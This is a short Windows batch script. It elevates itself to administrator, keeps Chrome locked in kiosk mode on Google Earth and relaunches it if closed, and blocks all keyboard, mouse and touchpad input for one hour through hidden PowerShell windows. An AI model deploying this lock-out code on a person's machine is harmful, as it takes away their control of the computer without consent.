@echo off

net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

REM Launch Chrome and restart it if it ever closes
start powershell -WindowStyle Hidden -Command ^
"$end = (Get-Date).AddHours(1); while((Get-Date) -lt $end){ $chrome = Get-Process chrome -ErrorAction SilentlyContinue; if(-not $chrome){ Start-Process 'chrome.exe' '--kiosk https://earth.google.com/'; }; Start-Sleep -Milliseconds 500; }"

REM Lock mouse, touchpad and keyboard for 1 hour
powershell -WindowStyle Hidden -Command ^
"Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class InputBlocker { [DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlockIt); }'; ^
[InputBlocker]::BlockInput($true); ^
Start-Sleep -Seconds 3600; ^
[InputBlocker]::BlockInput($false);"

echo Done! Everything unlocked.
pause